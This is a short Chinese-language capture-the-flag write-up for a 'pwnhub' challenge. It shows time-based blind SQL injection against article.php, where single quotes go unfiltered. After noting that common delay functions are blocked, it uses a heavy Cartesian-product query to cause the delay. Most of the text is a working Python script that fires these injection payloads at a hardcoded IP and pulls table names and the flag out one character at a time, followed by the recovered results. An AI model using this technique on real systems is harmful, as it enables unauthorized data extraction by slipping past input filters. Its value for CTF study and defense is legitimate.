article.php 14行没有过滤单引号 可以延时盲注
过滤了常规的延时函数、文件操作函数还有jion 
但是过滤不完全还是可以用笛卡儿积消耗服务器资源 来达到延时的目的
```
import requests
import time
import string

url = "http://52.80.179.198:8080/article.php?id=1"

databases = "select database()"
tables = "SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=database()"
columns = "SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'flags'"
flag = "select group_concat(flag) from flags"

tmp = ''

for k in range(1, 60):
    for i in string.printable:
        payload = "' and if(ascii(substr((" + flag + "), {}, 1)) = {}, 100, 0) and 100 > (select count(*) from information_schema.columns, information_schema.columns T1, article T2, article T3)--+".format(str(k), ord(i))
        t1 = time.time()
        res = requests.get(url + payload)
        r = res.content
        t2 = time.time()
        print i, t2 - t1
        if t2 - t1 > 2:
            tmp += i
            print "[+]find:" + i
            print "[+]flag: " + tmp
            break


# database: post
# tables: article,flags,
# columns: flag
# flag: pwnhub{}
# flag:a6fe3d9432024e97aa40bd867161561e
#                 04e97aa40bd867161561e
#                       a40bd867161561e)
# pwnhub{flag:a6fe3d9432024e97aa40bd867161561e}
```


